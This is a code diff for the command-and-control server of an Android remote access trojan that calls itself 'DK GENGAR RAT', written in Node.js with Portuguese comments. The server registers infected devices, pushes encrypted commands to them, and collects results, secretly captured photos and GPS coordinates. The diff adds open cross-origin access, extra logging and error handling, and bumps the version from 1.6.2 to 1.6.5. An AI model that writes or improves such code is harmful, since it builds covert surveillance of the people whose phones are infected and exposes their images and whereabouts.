@@ -7,7 +7,12 @@ const crypto = require("crypto");
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
-    maxHttpBufferSize: 1e8 // 100MB para fotos
+    maxHttpBufferSize: 1e8, // 100MB
+    cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
+    },
+    transports: ['websocket', 'polling'] // Suporte a ambos para garantir conexão
 });
 
 // Chave e IV para AES (Devem ser iguais aos do APK)
@@ -51,20 +56,20 @@ app.get("/health", (req, res) => {
 });
 
 io.on("connection", (socket) => {
-    console.log(`[SISTEMA] Nova conexão: ${socket.id}`);
+    console.log(`[SISTEMA] Nova conexão: ${socket.id} de ${socket.handshake.address}`);
 
     // Registro simplificado para garantir que o dispositivo apareça
     socket.on("register", (data) => {
         try {
-            // Se for string, tenta descriptografar. Se for objeto, usa direto.
+            console.log(`[SISTEMA] Recebido evento de registro de ${socket.id}`);
             let finalData = data;
             if (typeof data === 'string') {
                 const decrypted = decrypt(data);
                 if (decrypted) finalData = JSON.parse(decrypted);
-                else finalData = JSON.parse(data); // Tenta JSON puro
+                else finalData = JSON.parse(data);
             }
             
-            console.log(`[REGISTRO] Dispositivo: ${finalData.model} | OS: ${finalData.os}`);
+            console.log(`[REGISTRO SUCESSO] Dispositivo: ${finalData.model} | OS: ${finalData.os}`);
             socket.deviceData = finalData;
             io.emit("new_device", finalData);
         } catch (e) {
@@ -73,8 +78,7 @@ io.on("connection", (socket) => {
     });
 
     socket.on("command", (data) => {
-        console.log(`[COMANDO] ${data.cmd} enviado`);
-        // Envia comando em texto plano e criptografado para compatibilidade total
+        console.log(`[COMANDO] ${data.cmd} enviado para os dispositivos`);
         const encryptedCmd = encrypt(JSON.stringify(data));
         socket.broadcast.emit("command", {
             plain: data,
@@ -85,33 +89,44 @@ io.on("connection", (socket) => {
     socket.on("result", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         const finalMsg = decrypted ? JSON.parse(decrypted).msg : (typeof encryptedData === 'string' ? encryptedData : JSON.stringify(encryptedData));
+        console.log(`[RESULTADO] ${finalMsg}`);
         io.emit("server_log", finalMsg);
     });
 
     socket.on("photo_captured", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            const data = JSON.parse(decrypted);
-            io.emit("display_photo", data.image);
-            io.emit("server_log", "📸 Foto recebida!");
+            try {
+                const data = JSON.parse(decrypted);
+                console.log("[MÍDIA] Foto recebida");
+                io.emit("display_photo", data.image);
+                io.emit("server_log", "📸 Foto recebida com sucesso!");
+            } catch (e) {
+                console.error("[ERRO FOTO]", e.message);
+            }
         }
     });
 
     socket.on("location_received", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            const data = JSON.parse(decrypted);
-            io.emit("display_location", data);
-            io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
+            try {
+                const data = JSON.parse(decrypted);
+                console.log(`[GPS] Lat: ${data.lat}, Lon: ${data.lon}`);
+                io.emit("display_location", data);
+                io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
+            } catch (e) {
+                console.error("[ERRO GPS]", e.message);
+            }
         }
     });
 
-    socket.on("disconnect", () => {
-        console.log(`[SISTEMA] Conexão encerrada: ${socket.id}`);
+    socket.on("disconnect", (reason) => {
+        console.log(`[SISTEMA] Conexão encerrada: ${socket.id} | Motivo: ${reason}`);
     });
 });
 
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-    console.log(`DK GENGAR RAT V1.6.2 rodando na porta ${PORT}`);
+    console.log(`DK GENGAR RAT V1.6.5 rodando na porta ${PORT}`);
 });
